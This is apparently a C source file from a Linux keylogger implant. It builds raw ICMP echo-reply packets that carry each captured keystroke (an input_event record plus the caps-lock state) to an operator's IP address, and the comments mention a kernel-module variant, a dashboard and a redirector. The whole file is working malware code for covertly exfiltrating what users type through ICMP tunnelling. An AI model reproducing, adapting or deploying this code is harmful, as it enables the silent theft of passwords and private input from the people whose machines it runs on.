
#include <alloca.h>
#include <linux/input.h>
#include <stdlib.h>

#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include "implant.h"

int retrieve_ip_address(char *ip[32]) {

    /* open UDP socket to resolver google DNS, retrieve IP address in resp */

    const char *resolver = "8.8.8.8";
    const uint16_t dns_port = 53;

    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
#ifdef DEBUG
        DEBUG_LOG("[+] could not load UDP socket in retrieve_ip_address()\n");
        perror("socket");
#endif

    cleanup_close_socket:
        close(sockfd);
        return 0;
    }

    struct sockaddr_in serv = {0};
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr(resolver);
    serv.sin_port = htons(dns_port);

    if (-1 == connect(sockfd, (const struct sockaddr *)&serv, sizeof(serv))) {
#ifdef DEBUG
        DEBUG_LOG("[+] could not connect to %s (port: %d)\n", resolver, dns_port);
        perror("connect");
#endif

        goto cleanup_close_socket;
    }

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    if (-1 == getsockname(sockfd, (struct sockaddr *)&name, &namelen)) {
#ifdef DEBUG
        DEBUG_LOG("[+] could not get socket name\n");
        perror("getsockname");
#endif

        goto cleanup_close_socket;
    }

    const char *p = inet_ntop(AF_INET, &name.sin_addr, *ip, 32);
    if (!p) {

        goto cleanup_close_socket;
    }

    close(sockfd);
    return 1;
}

static uint16_t icmp_checksum(uint16_t *addr, int len) {
    int nleft = len;
    uint32_t sum = 0;
    uint16_t *w = addr;
    uint16_t answer = 0;

    // Adding 16 bits sequentially in sum
    while (nleft > 1) {
        sum += *w;
        nleft -= 2;
        w++;
    }

    // If an odd byte is left
    if (nleft == 1) {
        *(unsigned char *)(&answer) = *(unsigned char *)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return answer;
}

/* Layout of the DATA packet is following
 * [ Locale (length: 31), using_cap_lock, struct input_event dump ]
 */
int send_key_icmp(implant_t *implant, struct input_event event) {

    char payload[sizeof(struct input_event) + 32] = {0};

    /* for the userland implant, we will always assume the locale is
     * US, because I haven't yet found a way to hook evdev driver from here
     * and recover translated keys. Alternative would be to use something like
     * libxkbcommon but this means we cannot compile statically, which is something
     * that i want.
     *
     * If you want to have translated keys, for now you must use the kernel
     * module in the kernel/ directory. it will respect the same protocol
     * and be able to retrieve the information that you want.
     */
    strncpy(payload, "us", 2);
    payload[31] = implant->using_caps_lock;
    memccpy(payload + 32, &event, 0, sizeof(struct input_event));

    /* set up ICMP socket */
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
#ifdef DEBUG
        DEBUG_LOG("[+] could not load ICMP socket\n");
        perror("socket");
#endif

    cleanup_error:
        close(sockfd);
        return ERROR;
    }

    int enabled = 1;
    if (setsockopt(sockfd, IPPROTO_IP,
                   IP_HDRINCL,
                   (const char *)&enabled,
                   sizeof(enabled)) == -1) {
#ifdef DEBUG
        DEBUG_LOG("[+] could not set ICMP socket options\n");
        perror("setsockopt");
#endif

        goto cleanup_error;
    }

    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
                   &enabled,
                   sizeof(int)) < 0) {
#ifdef DEBUG
        DEBUG_LOG("[+] could not set ICMP socket options\n");
        perror("setsockopt");
#endif

        goto cleanup_error;
    }

    /* set packet metadata */

    /* NOTE(djnn): this will be the local IP address, dont rely on this on
       the dashboard side (use whatever your redirector / firewall gives u) */
    char *local_ip = alloca(32);
    if (!retrieve_ip_address((char **)&local_ip)) {
#ifdef DEBUG
        DEBUG_LOG("[+] could not get public ip address\n");
#endif

        goto cleanup_error;
    }

    int packet_type = ICMP_ECHOREPLY;

    struct in_addr src_addr = {0};
    struct in_addr dest_addr = {0};

    inet_pton(AF_INET, local_ip, &src_addr);
    inet_pton(AF_INET, implant->ip, &dest_addr);

    /* this will be what we actually send (basically just payload + a bunch of things) */
    char *full_packet = NULL;
    int packetsz = sizeof(struct iphdr) + sizeof(struct icmphdr) + sizeof(payload);

    full_packet = calloc(packetsz, sizeof(uint8_t));
    if (!full_packet) {
#ifdef DEBUG
        DEBUG_LOG("[+] send_icmp: could not allocate heap memory!\n");
        perror("calloc");
#endif

        goto cleanup_error;
    }

    struct iphdr *ip = (struct iphdr *)full_packet;
    struct icmphdr *icmp = (struct icmphdr *)(full_packet + sizeof(struct iphdr));
    char *icmp_payload = (char *)(full_packet + sizeof(struct iphdr) + sizeof(struct icmphdr));

    /* configuring the headers */

    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->id = rand();
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->tot_len = htons(packetsz);
    ip->saddr = src_addr.s_addr;
    ip->daddr = dest_addr.s_addr;

    icmp->code = 0;
    icmp->un.echo.sequence = rand();
    icmp->un.echo.id = rand();
    icmp->checksum = 0;

    memcpy(icmp_payload, payload, sizeof(payload));

    icmp->type = ICMP_ECHOREPLY;
    icmp->checksum = icmp_checksum((unsigned short *)icmp, sizeof(struct icmphdr) + sizeof(payload));

    struct sockaddr_in servaddr;
    memset(&servaddr, 0, sizeof(struct sockaddr_in));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = dest_addr.s_addr;

    sendto(sockfd, full_packet, packetsz, 0, (struct sockaddr *)&servaddr, sizeof(struct sockaddr_in));
    free(full_packet);
    return SUCCESSFUL;
}
